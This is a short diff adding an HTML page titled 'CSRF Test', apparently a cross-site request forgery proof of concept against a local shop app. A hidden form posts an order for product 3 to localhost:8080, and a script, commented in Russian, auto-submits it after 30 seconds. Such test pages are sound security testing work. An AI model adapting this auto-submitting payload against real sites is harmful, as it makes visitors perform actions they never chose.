@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body>
+    <h1>CSRF!</h1>
+    <p>PUSH!</p>
+    <form action="http://localhost:8080/order/3" method="post">
+        <input type="hidden" name="product3" value="1">
+        <button type="submit">PUSH!</button>
+    </form>
+    <script>
+        // Дополнительно: можно автоматически отправить форму через несколько секунд
+         setTimeout(function(){
+             document.forms[0].submit();
+         }, 30000);
+    </script>
+</body>
+</html>
